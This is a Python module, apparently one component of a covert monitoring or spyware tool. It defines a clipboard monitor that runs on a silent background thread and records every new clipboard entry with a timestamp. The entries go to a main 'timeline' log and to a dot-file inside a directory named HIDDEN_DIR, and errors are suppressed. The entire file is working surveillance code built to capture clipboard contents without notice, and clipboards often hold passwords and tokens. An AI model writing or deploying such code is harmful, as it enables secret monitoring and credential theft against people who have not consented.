import pyperclip
import time
import threading
import os
from datetime import datetime
from config import LOG_FILE, HIDDEN_DIR

class ClipboardMonitor:
    def __init__(self, interval=2):
        self.interval = interval
        self.last_content = ""
        self.log_path = os.path.join(HIDDEN_DIR, LOG_FILE)
        self.clipboard_log_path = os.path.join(HIDDEN_DIR, ".clipboard.txt")
        self.running = True

    def _timestamp(self):
        return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

    def monitor(self):
        while self.running:
            try:
                current = pyperclip.paste()
                if current and current != self.last_content:
                    timestamp = self._timestamp()
                    # Write to main log (timeline)
                    with open(self.log_path, 'a', encoding='utf-8') as f:
                        f.write(f"{timestamp} [CLIPBOARD] {current}\n")
                    # Write to dedicated clipboard file
                    with open(self.clipboard_log_path, 'a', encoding='utf-8') as f:
                        f.write(f"{timestamp} {current}\n")
                    self.last_content = current
            except:
                pass
            time.sleep(self.interval)

    def start(self):
        # Ensure directory exists
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        thread = threading.Thread(target=self.monitor, daemon=True)
        thread.start()

    def stop(self):
        self.running = False